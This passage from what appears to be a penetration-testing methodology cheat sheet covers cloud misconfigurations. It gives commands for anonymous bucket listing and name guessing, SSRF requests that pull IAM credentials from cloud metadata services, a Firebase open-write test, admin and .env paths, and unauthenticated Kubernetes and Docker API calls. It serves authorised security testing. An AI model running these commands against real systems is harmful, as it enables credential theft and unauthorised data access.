## Cloud / Infra Misconfigs

### S3 / GCS / Azure Blob
```bash
# S3 public listing
aws s3 ls s3://target-bucket-name --no-sign-request

# Try common names
for name in target target-backup target-assets target-prod target-staging target-uploads target-data; do
  curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done
```

### EC2 Metadata (via SSRF)
```bash
http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/
# Returns role name, then:
http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/ROLE-NAME
# Returns AccessKeyId, SecretAccessKey, Token -> Critical

# GCP (needs header Metadata-Flavor: Google):
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure (needs header Metadata: true):
http://[REDACTED_IP]/metadata/instance?api-version=2021-02-01
```

### Firebase Open Rules
```bash
curl --max-time 30 --connect-timeout 10 -s "https://TARGET-APP.firebaseio.com/.json"
# If data returned -> open read
curl --max-time 30 --connect-timeout 10 -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"'
# If success -> open write -> Critical
```

### Exposed Admin Panels
```bash
/jenkins       /grafana       /kibana        /elasticsearch
/swagger-ui.html  /api-docs   /phpMyAdmin    /adminer.php
/.env          /config.json   /server-status /actuator/env
```

### Kubernetes / Docker
```bash
# K8s API (unauthenticated):
curl --max-time 30 --connect-timeout 10 -sk https://TARGET:6443/api/v1/namespaces/default/pods
# Docker API:
curl --max-time 30 --connect-timeout 10 -s http://TARGET:2375/containers/json
```

---

# PHASE 4: VALIDATE

